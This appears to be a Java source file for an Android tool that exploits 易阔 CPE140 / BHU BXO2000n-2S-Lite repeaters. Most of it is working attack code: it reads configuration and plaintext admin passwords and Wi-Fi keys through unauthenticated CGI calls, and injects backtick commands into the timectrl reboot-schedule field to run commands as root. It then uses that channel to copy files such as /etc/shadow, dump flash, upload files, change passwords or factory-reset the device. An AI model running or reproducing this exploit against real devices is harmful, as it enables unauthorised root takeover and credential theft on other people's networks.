package com.picpe.cpe140;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * 易阔 CPE140 / BHU BXO2000n-2S-Lite 中继器「完全控制」客户端（Android 版）。
 *
 * <p>两条腿，都不需要 Web 登录会话：
 * <ul>
 *   <li>Web API —— /cgi-bin/* 全部未认证，POST + JSON（自动补 interval 时间戳）。
 *       可读全量配置（含明文口令 / PSK）、改配置、改管理员密码、重启、恢复出厂。</li>
 *   <li>root RCE —— /cgi-bin/timectrl (opcode=3, cronpara=2) 的字段值被未转义拼进
 *       {@code sh -c "uci -c /etc/config set administrator.reboot.week=<值>"}，
 *       用反引号命令替换即可 root 执行；单次载荷上限约 960 字节。</li>
 *   <li>回显 —— 命令输出重定向到 /tmp/.cpeout，再让 /www/.cpeout 指向它，
 *       uhttpd 跟随符号链接；GET /.cpeout 取回。载荷自身不输出任何字符，
 *       所以写回 uci 的值与原值一致，不会污染定时重启规则。</li>
 * </ul>
 * 仅供自有设备的安全研究与日常运维使用。
 */
public class Cpe {

    public static final String OUT_TMP = "/tmp/.cpeout";
    public static final String OUT_LINK = "/www/.cpeout";
    public static final String OUT_URL = "/.cpeout";
    public static final String UP_TMP = "/tmp/upload.img";
    public static final String SH_TMP = "/tmp/.cpesh";
    public static final int INJ_MAX = 880;
    public static final int BUDGET = 620;

    public static final Set<String> DANGEROUS = new HashSet<>(Arrays.asList(
            "OP_MODE", "VLAN_ENABLED", "PSMODE", "LAN_IP_ADDR", "LAN_NETMASK",
            "LAN_DHCP_SERVER_ENABLED", "DHCP_SERVER_ENABLED", "WLAN0_VAP0_SSID",
            "WLAN0_VAP0_PSK", "WLAN0_VAP5_SSID", "WLAN0_VAP5_PSK",
            "WLAN0_VAP0_CHANNEL", "REG_DOMAIN", "HW_NAT_ENABLED"));

    public static final String[] MODES = {"gateway", "repeater", "wisp", "ap", "wds"};

    public String host;
    public int port = 80;
    public int timeout = 20000;
    public int lastCode = 0;
    /** 会话内简单日志（调试用）。 */
    public final List<String> log = new ArrayList<>();

    private String week, enabled, hour, minute;
    private boolean linkOk = false;

    public Cpe(String host) {
        this.host = host;
    }

    // ------------------------------------------------------------------ HTTP

    private byte[] http(String path, byte[] body, String ctype, int to) throws IOException {
        HttpURLConnection c = (HttpURLConnection) new URL("http://" + host + ":" + port + path).openConnection();
        c.setConnectTimeout(Math.min(to, 15000));
        c.setReadTimeout(to);
        c.setRequestProperty("Content-Type", ctype == null ? "application/json" : ctype);
        c.setRequestProperty("User-Agent", "cpe140-android/1.0");
        c.setRequestProperty("Accept-Encoding", "identity");
        if (body != null) {
            c.setDoOutput(true);
            c.setFixedLengthStreamingMode(body.length);
        }
        c.connect();
        if (body != null) {
            OutputStream o = c.getOutputStream();
            o.write(body);
            o.close();
        }
        lastCode = c.getResponseCode();
        InputStream in = lastCode >= 400 ? c.getErrorStream() : c.getInputStream();
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        if (in != null) {
            byte[] buf = new byte[1 << 16];
            int n;
            while ((n = in.read(buf)) > 0) {
                bo.write(buf, 0, n);
            }
            in.close();
        }
        c.disconnect();
        byte[] r = bo.toByteArray();
        synchronized (log) {
            log.add(lastCode + " " + path + " " + r.length + "B");
            if (log.size() > 400) {
                log.remove(0);
            }
        }
        return r;
    }

    public JSONObject api(String cgi, JSONObject p) throws Exception {
        return api(cgi, p, timeout);
    }

    public JSONObject api(String cgi, JSONObject p, int to) throws Exception {
        JSONObject d = p == null ? new JSONObject() : new JSONObject(p.toString());
        if (!d.has("interval")) {
            d.put("interval", System.currentTimeMillis() / 1000L);
        }
        byte[] r = http("/cgi-bin/" + cgi, d.toString().getBytes("UTF-8"), "application/json", to);
        String s = new String(r, "UTF-8").trim();
        if (s.isEmpty()) {
            return new JSONObject();
        }
        JSONObject o = new JSONObject(s);
        if ("-1".equals(String.valueOf(o.opt("result")))) {
            throw new IOException(cgi + " 返回 result=-1（参数被拒）");
        }
        return o;
    }

    // ------------------------------------------------------------- 只读信息

    public JSONObject sysinfo() throws Exception {
        return api("sysinfo", new JSONObject().put("opcode", "1"));
    }

    public JSONObject wirelessStatus() throws Exception {
        return api("wireless_status", new JSONObject().put("opcode", "1"));
    }

    public JSONObject wan() throws Exception {
        return api("wan", new JSONObject().put("opcode", "1"));
    }

    public JSONObject lan() throws Exception {
        return api("lan", new JSONObject().put("opcode", "1"));
    }

    public JSONObject wifiConfig() throws Exception {
        return api("wireless", new JSONObject().put("opcode", "1"));
    }

    public JSONObject clients() throws Exception {
        return api("lan_dhcpserver", new JSONObject().put("opcode", "1"));
    }

    public JSONObject scan() throws Exception {
        return api("wireless_scan", new JSONObject().put("opcode", "1").put("wlanid", "0"), 60000);
    }

    public JSONObject channels() throws Exception {
        return api("wireless_channel", new JSONObject().put("opcode", "1"));
    }

    public JSONObject sessions() throws Exception {
        return api("active", new JSONObject().put("opcode", "1"));
    }

    public JSONObject cfgAll() throws Exception {
        return api("easyconfig", new JSONObject().put("opcode", "1"));
    }

    public String cfgGet(String key) throws Exception {
        return cfgAll().optString(key, "");
    }

    public JSONObject cfgSet(boolean force, String key, String value) throws Exception {
        if (DANGEROUS.contains(key.toUpperCase()) && !force) {
            throw new IOException("拒绝对危险键写入 " + key + "（确认无误再加 --force）");
        }
        JSONObject p = new JSONObject().put("opcode", "3");
        p.put(key, value);
        return api("easyconfig", p);
    }

    // ------------------------------------------------------ root RCE 通道

    private static JSONObject schedDefaults() {
        try {
            return new JSONObject().put("AUTO_REBOOT_ENABLED", "1").put("AUTO_REBOOT_WEEK", "0")
                    .put("AUTO_REBOOT_HOUR", "4").put("AUTO_REBOOT_MIN", "0");
        } catch (Exception e) {
            return new JSONObject();
        }
    }

    /** 定时重启的原始 4 个值（只读一次）。 */
    public JSONObject sched() throws Exception {
        if (week == null) {
            JSONObject s;
            try {
                s = api("timectrl", new JSONObject().put("opcode", "3").put("cronpara", "1"));
            } catch (Exception e) {
                s = schedDefaults();
            }
            enabled = s.optString("AUTO_REBOOT_ENABLED", "1");
            week = s.optString("AUTO_REBOOT_WEEK", "0");
            hour = s.optString("AUTO_REBOOT_HOUR", "4");
            minute = s.optString("AUTO_REBOOT_MIN", "0");
        }
        return new JSONObject().put("AUTO_REBOOT_ENABLED", enabled).put("AUTO_REBOOT_WEEK", week)
                .put("AUTO_REBOOT_HOUR", hour).put("AUTO_REBOOT_MIN", minute);
    }

    private void inject(String inner, int to) throws Exception {
        JSONObject s = sched();
        // 末尾补 chmod：cp 会把源文件权限（如 /etc/shadow 的 600）带过来，
        // uhttpd 对 600 的文件回 403，统一放开到 644 才能读回。
        // 注意：载荷里不能出现反引号 / 双引号 / 反斜杠 / 大括号。
        String payload = s.optString("AUTO_REBOOT_WEEK", "0") + "`" + inner
                + "; chmod 644 " + OUT_TMP + " 2>/dev/null`";
        if (payload.length() > INJ_MAX) {
            throw new IOException("注入载荷过长 " + payload.length() + " > " + INJ_MAX);
        }
        JSONObject d = new JSONObject();
        d.put("opcode", "3");
        d.put("cronpara", "2");
        d.put("AUTO_REBOOT_ENABLED", s.optString("AUTO_REBOOT_ENABLED", "1"));
        d.put("AUTO_REBOOT_HOUR", s.optString("AUTO_REBOOT_HOUR", "4"));
        d.put("AUTO_REBOOT_MIN", s.optString("AUTO_REBOOT_MIN", "0"));
        d.put("AUTO_REBOOT_WEEK", payload);
        api("timectrl", d, to);
    }

    /** shell 单引号引用。 */
    public static String q(String s) {
        if (s.matches("[A-Za-z0-9_@%+=:,./-]+")) {
            return s;
        }
        return "'" + s.replace("'", "'\\''") + "'";
    }

    private static boolean unsafe(String cmd) {
        return cmd.indexOf('`') >= 0 || cmd.indexOf('"') >= 0 || cmd.indexOf('\\') >= 0;
    }

    private void ensureLink() throws Exception {
        if (linkOk) {
            return;
        }
        inject(": > " + OUT_TMP + "; ln -sf " + OUT_TMP + " " + OUT_LINK, timeout);
        linkOk = true;
    }

    /** 以 root 执行命令，输出全部落到 OUT_TMP（不取回）。 */
    public void exec(String cmd, int to) throws Exception {
        ensureLink();
        String c = cmd.trim();
        if (!unsafe(c) && c.length() <= BUDGET) {
            inject("( " + c + " ) > " + OUT_TMP + " 2>&1", to);
        } else {
            http("/cgi-bin/upload", (c + "\n").getBytes("UTF-8"), "application/octet-stream", 60000);
            inject("mv -f " + UP_TMP + " " + SH_TMP + "; sh " + SH_TMP + " > " + OUT_TMP + " 2>&1", to);
        }
    }

    public String readOut(int to) throws Exception {
        byte[] r = http(OUT_URL, null, null, to);
        if (lastCode == 403) {
            throw new IOException("403：/tmp/.cpeout 权限不足，读不到输出");
        }
        return new String(r, "UTF-8");
    }

    /** 以 root 执行命令并取回 stdout+stderr。 */
    public String run(String cmd) throws Exception {
        return run(cmd, 120000);
    }

    public String run(String cmd, int to) throws Exception {
        exec(cmd, to);
        return readOut(Math.max(60000, to));
    }

    // ------------------------------------------------------------- 文件传输

    public byte[] readBytes(String remote, int to) throws Exception {
        ensureLink();
        String q = q(remote);
        exec("cp " + q + " " + OUT_TMP + " 2>/dev/null || cat " + q + " > " + OUT_TMP, to);
        return http(OUT_URL, null, null, to);
    }

    public void push(byte[] data, String remote) throws Exception {
        ensureLink();
        http("/cgi-bin/upload", data, "application/octet-stream",
                (int) Math.max(60000, data.length / 15 + 30000));
        String q = q(remote);
        exec("mv -f " + UP_TMP + " " + q + " 2>/dev/null || cp " + UP_TMP + " " + q, 90000);
        String got = run("wc -c < " + q).trim();
        try {
            if (Integer.parseInt(got.split("\\s+")[0]) != data.length) {
                throw new IOException("上传校验失败：期望 " + data.length + " 实际 " + got);
            }
        } catch (NumberFormatException e) {
            throw new IOException("上传校验失败：" + got);
        }
    }

    /** 整片 flash 备份（默认 mtd9 = fullflash 8MB）。 */
    public byte[] dumpFlash(int mtd) throws Exception {
        return readBytes("/dev/mtd" + mtd, 600000);
    }

    // --------------------------------------------------------------- 管理

    public JSONObject reboot() throws Exception {
        return api("devmanage", new JSONObject().put("opcode", "5"), 10000);
    }

    public JSONObject factoryReset() throws Exception {
        return api("devmanage", new JSONObject().put("opcode", "3"), 10000);
    }

    public JSONObject setPassword(String user, String oldPw, String newPw) throws Exception {
        JSONObject p = new JSONObject();
        p.put("opcode", "8");
        p.put("currentuser", user);
        p.put("name", user);
        p.put("oldpassword", oldPw);
        p.put("password", newPw);
        return api("devmanage", p);
    }

    public JSONObject setSchedule(boolean enable, int wk, int h, int m) throws Exception {
        JSONObject p = new JSONObject();
        p.put("opcode", "3");
        p.put("cronpara", "2");
        p.put("AUTO_REBOOT_ENABLED", enable ? "1" : "0");
        p.put("AUTO_REBOOT_WEEK", String.valueOf(wk));
        p.put("AUTO_REBOOT_HOUR", String.valueOf(h));
        p.put("AUTO_REBOOT_MIN", String.valueOf(m));
        JSONObject r = api("timectrl", p);
        week = null;
        return r;
    }

    /** ARP 表：本固件没有 sys_arplist，直接读 /proc/net/arp。 */
    public List<String[]> arp() throws Exception {
        List<String[]> out = new ArrayList<>();
        for (String ln : run("cat /proc/net/arp").split("\n")) {
            String[] p = ln.trim().split("\\s+");
            if (p.length >= 6 && !p[0].equals("IP")) {
                out.add(new String[]{p[0], p[3], p[5]});
            }
        }
        return out;
    }

    /** 清理设备上的所有临时文件。 */
    public void clean() {
        linkOk = false;
        try {
            inject("rm -f " + OUT_TMP + " " + OUT_LINK + " " + UP_TMP + " " + SH_TMP, timeout);
        } catch (Exception ignored) {
            // 设备不可达时静默
        }
    }

    /** 自检字符串。 */
    public String doctor() {
        StringBuilder sb = new StringBuilder();
        try {
            JSONObject si = sysinfo();
            sb.append("设备连通        OK  ").append(si.optString("PRODUCTNAME")).append(" / ")
                    .append(si.optString("FIRMVERSION")).append('\n');
        } catch (Exception e) {
            return "设备连通        FAIL " + e.getMessage() + "\n";
        }
        try {
            int n = cfgAll().length();
            sb.append("未认证读配置    OK  ").append(n).append(" 项，明文管理员口令=")
                    .append(cfgAll().optString("USER_PASSWORD")).append('\n');
        } catch (Exception e) {
            sb.append("未认证读配置    FAIL ").append(e.getMessage()).append('\n');
        }
        try {
            long t0 = System.currentTimeMillis();
            run("true");
            long base = System.currentTimeMillis() - t0;
            t0 = System.currentTimeMillis();
            run("sleep 3");
            long slow = System.currentTimeMillis() - t0;
            sb.append("root RCE 注入   ").append(slow - base > 2000 ? "OK" : "FAIL")
                    .append("  true=").append(base).append("ms sleep3=").append(slow).append("ms\n");
        } catch (Exception e) {
            sb.append("root RCE 注入   FAIL ").append(e.getMessage()).append('\n');
        }
        try {
            sb.append("以 root 执行    OK  ").append(run("id").trim()).append('\n');
        } catch (Exception e) {
            sb.append("以 root 执行    FAIL ").append(e.getMessage()).append('\n');
        }
        sb.append("出厂 root 口令  --  见报告；源码不硬编码（公开仓库不替人开后门）\n");
        return sb.toString();
    }

    /** 取 JSON 里第一层列表（各种 CGI 的 ItemList.data 布局不一）。 */
    public static JSONArray rows(JSONObject o) {
        if (o == null) {
            return new JSONArray();
        }
        for (String k : new String[]{"list", "data", "items", "ItemList", "clientlist", "aplist"}) {
            Object v = o.opt(k);
            if (v instanceof JSONArray) {
                return (JSONArray) v;
            }
            if (v instanceof JSONObject) {
                JSONArray r = rows((JSONObject) v);
                if (r.length() > 0) {
                    return r;
                }
            }
        }
        return new JSONArray();
    }

    /** 把任意 JSON 渲染成可读文本。 */
    public static String pretty(JSONObject o) {
        JSONArray r = rows(o);
        if (r.length() > 0) {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < r.length(); i++) {
                JSONObject it = r.optJSONObject(i);
                if (it == null) {
                    sb.append(r.opt(i)).append('\n');
                    continue;
                }
                for (java.util.Iterator<String> k = it.keys(); k.hasNext(); ) {
                    String key = k.next();
                    sb.append("  ").append(key).append(": ").append(it.optString(key)).append('\n');
                }
                sb.append('\n');
            }
            return sb.toString();
        }
        try {
            return o.toString(2);
        } catch (Exception e) {
            return String.valueOf(o);
        }
    }
}
